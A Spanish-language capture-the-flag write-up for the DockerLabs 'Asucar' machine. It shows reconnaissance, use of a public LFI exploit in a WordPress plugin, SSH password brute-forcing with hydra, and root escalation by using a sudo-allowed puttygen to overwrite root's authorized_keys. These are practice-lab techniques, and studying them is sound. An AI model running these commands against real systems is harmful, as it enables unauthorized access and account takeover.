# Máquina Asucar

Dificultad -> Medium

Enlace a la máquina -> [Dockerlabs](https://dockerlabs.es/)

## Reconocimiento

Comenzamos realizando un escaneo general con **nmap** sobre la IP de la máquina víctima para ver que puertos tiene abiertos.

```shell
nmap -p- --open -sT --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allPorts
________________________________________________
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack
80/tcp open  http    syn-ack
```

Lanzamos un conjunto de scripts predeterminado con **nmap** para que nos reporte más información relacionada a los puertos descubiertos en el anterior escaneo.

```shell
nmap -sCV -p 172.17.0.2 -oN targeted
________________________________________________

```

![Pasted image 20240512163303](https://github.com/albertomarcostic/DockerLabs-WriteUps/assets/131155486/179bb0a9-5b73-4342-ba08-3e8b68fe7fcb)

Revisando el código fuente vemos que hay recursos que se están cargando de **asucar.d** por lo que lo añadimos a nuestro **/etc/hosts**.

```
172.17.0.2  asucar.dl
```

Aplicamos **Fuzzing**.

```shell
gobuster dir -u http://172.17.0.2/ -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt -t 20 --add-slash
-----------------------------------------------------
/icons/               (Status: 403) [Size: 275]
/wp-content/          (Status: 200) [Size: 0]  
/wordpress/           (Status: 200) [Size: 745]
/wp-includes/         (Status: 200) [Size: 58715]
/wp-admin/            (Status: 302) [Size: 0]
```

He aplicado algo de reconocimiento con **wpscan** pero no he encontrado nada relevante.

--------------
## Explotación

Si le hacemos un curl a la página principal y vemos si desde ahí llama a algo con la palabra **plugin** vemos que está utilizando el plugin **site editor**.

![Pasted image 20240512164642](https://github.com/albertomarcostic/DockerLabs-WriteUps/assets/131155486/e7828a86-5bf9-41f7-a5df-057996781541)

Buscamos exploits para ese plugin concreto y encontramos un **LFI** para una versión un poco posterior a la que tenemos nosotros, por lo que es posible que nos sirva.

![Pasted image 20240512164622](https://github.com/albertomarcostic/DockerLabs-WriteUps/assets/131155486/8e01942a-dded-4294-81d1-80fb88c9f07f)

Lo podemos ver con el comando:

```shell
searchsploit -x php/webapps/44340.txt
```

![Pasted image 20240512164607](https://github.com/albertomarcostic/DockerLabs-WriteUps/assets/131155486/485c86fc-d985-43db-9e49-65c9f60700cb)

Nos da una **Proof of Concept** que adaptamos fácilmente a nuestra situación y tenemos el **LFI** !

![Pasted image 20240512164553](https://github.com/albertomarcostic/DockerLabs-WriteUps/assets/131155486/073656cf-bd46-46bc-be97-01df32e1f18d)

Vemos un usuario del sistema que se llama **curiosito**.
Aplicamos fuerza bruta con **hydra** sobre el usuario:

```shell
hydra -l curiosito -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2 -t 10 -I
------------------------------------------------------------------
[22][ssh] host: 172.17.0.2   login: curiosito   password: password1
```

Estamos dentro !

------------------------------
## Escalada de privilegios

Si hacemos **sudo -l** vemos que podemos ejecutar **puttygen** como el usuario **root**:

```shell
sudo -l
----------------------------
User curiosito may run the following commands on a562c37486ba:
    (root) NOPASSWD: /usr/bin/puttygen
```

Lo podemos explotar con:

```shell
puttygen -t rsa -b 2048 -O private-openssh -o ~/.ssh/id
puttygen -L ~/.ssh/id >> ~/.ssh/authorized_keys
sudo puttygen /home/curiosito/.ssh/id -o /root/.ssh/id
sudo puttygen /home/curiosito/.ssh/id -o /root/.ssh/authorized_keys -O public-openssh
```

Y en nuestra máquina atacante nos descargamos la clave y nos conectamos como **root**:

```shell
scp curiosito@172.17.0.2:/home/curiosito/.ssh/id .
ssh -i id root@172.17.0.2
```

```shell
whoami
----------------
root
```

Hemos alcanzado el nivel de privilegios máximos en el sistema !
